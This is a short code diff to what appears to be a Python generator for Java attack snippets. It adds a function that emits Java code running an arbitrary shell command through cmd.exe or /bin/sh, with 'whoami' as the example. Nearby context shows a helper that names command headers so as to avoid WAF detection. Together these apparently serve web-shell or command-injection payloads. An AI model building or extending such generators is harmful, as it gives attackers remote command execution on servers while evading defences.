@@ -25,6 +25,31 @@ def java_string_literal(s: str) -> str:
     )
 
 
+def java_os_adaptive_exec(
+    cmd_expr: str,
+    *,
+    process_var: str = "p",
+    wait_for: bool = False,
+    indent: str = "",
+) -> str:
+    """生成按 OS 选择 cmd.exe /bin/sh 的 Runtime.exec Java 片段。
+
+    ``cmd_expr`` 为已是合法 Java 表达式的命令字符串（例如 ``\"whoami\"``）。
+    """
+    ind = indent
+    lines = [
+        f'{ind}String _os = System.getProperty("os.name", "").toLowerCase();',
+        f"{ind}boolean _win = _os.contains(\"win\");",
+        f"{ind}String[] _cmds = _win",
+        f'{ind}    ? new String[]{{"cmd.exe", "/c", {cmd_expr}}}',
+        f'{ind}    : new String[]{{"/bin/sh", "-c", {cmd_expr}}};',
+        f"{ind}Process {process_var} = Runtime.getRuntime().exec(_cmds);",
+    ]
+    if wait_for:
+        lines.append(f"{ind}{process_var}.waitFor();")
+    return "\n".join(lines)
+
+
 def gen_cmd_header(prefix: str = "X-Cmd") -> str:
     """生成较不易被 WAF 误伤的命令头名（可选随机后缀）。"""
     suffix = "".join(random.choices(string.ascii_letters, k=4))
